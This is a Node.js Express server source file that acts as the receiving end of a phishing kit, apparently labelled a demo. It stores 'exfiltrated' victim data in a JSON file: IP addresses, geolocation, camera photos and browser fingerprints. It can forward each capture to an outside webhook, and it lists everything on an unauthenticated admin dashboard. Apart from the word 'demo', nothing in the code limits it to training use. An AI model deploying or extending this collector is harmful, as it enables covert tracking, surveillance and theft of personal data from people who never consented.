const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // serves index.html from /public

// Ensure data directory and captures.json exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);
const capturesFile = path.join(dataDir, 'captures.json');
if (!fs.existsSync(capturesFile)) fs.writeFileSync(capturesFile, '[]');

// Helper: load existing captures
function loadCaptures() {
    return JSON.parse(fs.readFileSync(capturesFile));
}

// Helper: save captures
function saveCaptures(captures) {
    fs.writeFileSync(capturesFile, JSON.stringify(captures, null, 2));
}

// Endpoint to receive exfiltrated data
app.post('/capture', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Save to file
    const captures = loadCaptures();
    captures.push(data);
    saveCaptures(captures);

    // Optional: Webhook (set WEBHOOK_URL environment variable)
    if (process.env.WEBHOOK_URL) {
        fetch(process.env.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.error('Webhook failed:', err));
    }

    console.log('[CAPTURED]', data);
    res.json({ status: 'ok' });
});

// Admin dashboard
app.get('/admin', (req, res) => {
    const captures = loadCaptures();
    res.send(`
        <html>
        <head>
            <title>Phishing Demo Dashboard</title>
            <style>
                body { font-family: Arial; margin:20px; }
                table { border-collapse: collapse; width:100%; }
                th,td { border:1px solid #ddd; padding:8px; text-align:left; }
                th { background-color:#f2f2f2; }
                img { max-width:200px; max-height:150px; }
            </style>
        </head>
        <body>
            <h1>Captured Data</h1>
            <table>
                <tr>
                    <th>Time</th>
                    <th>IP</th>
                    <th>Location</th>
                    <th>Photo</th>
                    <th>User Agent</th>
                </tr>
                ${captures.map(c => `
                    <tr>
                        <td>${c.timestamp}</td>
                        <td>${c.ip}</td>
                        <td>${c.location ? c.location.lat + ', ' + c.location.lng : 'N/A'}</td>
                        <td>${c.photo ? `<img src="${c.photo}" />` : 'No photo'}</td>
                        <td>${c.fingerprint?.userAgent || ''}</td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});